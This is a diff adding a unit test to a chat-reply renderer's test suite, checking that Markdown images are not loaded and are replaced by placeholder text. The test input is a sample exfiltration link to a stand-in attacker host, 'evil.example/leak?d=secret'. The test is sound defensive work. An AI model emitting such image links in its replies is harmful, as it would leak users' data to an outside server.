@@ -59,4 +59,11 @@ describe("MessageContent (EXP-003 L2: 返答の HTML を HTML として出さな
     expect(out).toContain('href="https://example.com"');
     expect(out).toContain('rel="noopener noreferrer"');
   });
+
+  it("Markdown の画像は読み込まず、代わりの文字だけを出す (EXP-010 の安全レビュー)", () => {
+    const out = html("![図](https://evil.example/leak?d=secret)");
+    expect(out).not.toMatch(/<img/i);
+    expect(out).not.toContain("evil.example");
+    expect(out).toContain("[画像: 図]");
+  });
 });
